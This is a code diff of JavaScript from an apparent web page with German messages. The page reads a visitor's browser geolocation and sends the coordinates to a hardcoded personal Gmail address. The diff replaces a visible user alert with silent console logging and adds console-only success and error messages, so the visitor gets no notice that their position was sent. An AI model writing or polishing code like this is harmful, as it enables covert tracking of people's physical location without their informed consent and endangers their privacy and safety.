@@ -49,7 +49,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendEmail, showError);
             } else {
-                alert("Geolocation wird von diesem Browser nicht unterstützt.");
+                console.log("Geolocation wird von diesem Browser nicht unterstützt.");
             }
         }
 
@@ -64,18 +64,26 @@
                 latitude: latitude,
                 longitude: longitude,
                 user_email: "voegeli05@gmail.com" // Empfängeradresse
-            })
+            }).then(function(response) {
+                console.log("Standort erfolgreich gesendet.");
+            }, function(error) {
+                console.error("Fehler beim Senden des Standorts:", error);
+            });
         }
 
         function showError(error) {
             switch (error.code) {
                 case error.PERMISSION_DENIED:
+                    console.log("Standortfreigabe abgelehnt.");
                     break;
                 case error.POSITION_UNAVAILABLE:
+                    console.log("Standortinformationen sind nicht verfügbar.");
                     break;
                 case error.TIMEOUT:
+                    console.log("Die Anforderung zum Abrufen des Standorts ist abgelaufen.");
                     break;
                 case error.UNKNOWN_ERROR:
+                    console.log("Ein unbekannter Fehler ist aufgetreten.");
                     break;
             }
         }
